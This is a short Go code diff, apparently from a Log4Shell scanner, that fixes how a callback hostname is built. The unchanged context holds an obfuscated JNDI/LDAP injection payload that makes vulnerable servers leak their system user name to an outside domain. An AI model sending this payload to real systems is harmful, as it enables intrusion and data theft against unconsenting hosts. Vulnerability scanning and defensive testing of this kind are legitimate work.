@@ -218,7 +218,7 @@ func (a *app) worker() {
 			a.errorChan <- err
 			continue
 		}
-		host := fmt.Sprintf("%s.%s", u.Host, *domain)
+		host := fmt.Sprintf("%s.%s", u.Hostname(), *domain)
 		payload := fmt.Sprintf("${${::-j}${::-n}${::-d}${::-I}:ldap://${sys:user.name}.%s/%s}", host, randString(5))
 		log.Debug(payload)
 		if err := a.request(ctx, x, payload); err != nil {
